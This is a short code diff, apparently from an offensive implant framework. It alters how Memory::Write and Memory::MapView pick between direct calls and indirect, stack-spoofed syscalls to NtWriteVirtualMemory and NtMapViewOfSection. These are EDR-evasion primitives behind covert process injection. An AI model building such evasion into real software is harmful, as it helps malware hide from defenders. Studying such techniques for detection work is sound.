@@ -250,21 +250,20 @@ auto DECLFN Memory::Write(
         ));
     }
 
-    UPTR Address = ( Flags & SYSCALL_SPOOF_INDIRECT )
+    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
         ? (UPTR)Self->Sys->Ext[Sys::Write].Instruction
         : (UPTR)Self->Ntdll.NtWriteVirtualMemory;
 
-    UPTR ssn = (Flags & SYSCALL_SPOOF_INDIRECT )
+    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
         ? (UPTR)Self->Sys->Ext[Sys::Write].ssn
         : 0;
 
-    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
-        Status = Self->Spf->Call(
-            Address, ssn, (UPTR)Handle, (UPTR)Base,
-            (UPTR)Buffer, (UPTR)Size, (UPTR)Written
-        );
-    }
-    
+
+    Status = Self->Spf->Call(
+        Address, ssn, (UPTR)Handle, (UPTR)Base,
+        (UPTR)Buffer, (UPTR)Size, (UPTR)Written
+    );
+
     Self->Usf->NtStatusToError( Status );
 
     return NT_SUCCESS( Status );
@@ -331,7 +330,7 @@ auto DECLFN Memory::MapView(
         ? (UPTR)Self->Sys->Ext[Sys::MapView].Instruction
         : (UPTR)Self->Ntdll.NtMapViewOfSection;
 
-    UPTR ssn = (Flags & SYSCALL_SPOOF_INDIRECT)
+    UPTR ssn = (Flags == SYSCALL_SPOOF_INDIRECT)
         ? (UPTR)Self->Sys->Ext[Sys::MapView].ssn
         : 0;
 
